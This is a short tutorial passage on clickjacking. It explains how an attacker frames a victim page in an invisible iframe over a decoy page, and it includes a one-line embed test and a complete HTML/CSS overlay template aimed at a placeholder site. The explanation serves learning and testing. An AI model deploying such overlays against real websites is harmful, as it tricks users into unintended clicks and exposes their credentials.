**Clickjacking** is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 

So, the attacker creates their own webpage, which they place with very low opacity, and embeds the victim page using an iframe (HTML tag). This way, the victim user thinks they are accessing the legitimate page. The attacker can add different layers over the supposed login page to hijack credentials. To quickly test if this attack could be applied, one just needs to attempt to embed the victim page in an iframe.

```bash
<iframe id="target_website" src="https://vulnerable-website.com">
```
## How to construct a basic clickjacking attack
Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. An example using the style tag and parameters is as follows:
```bash
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```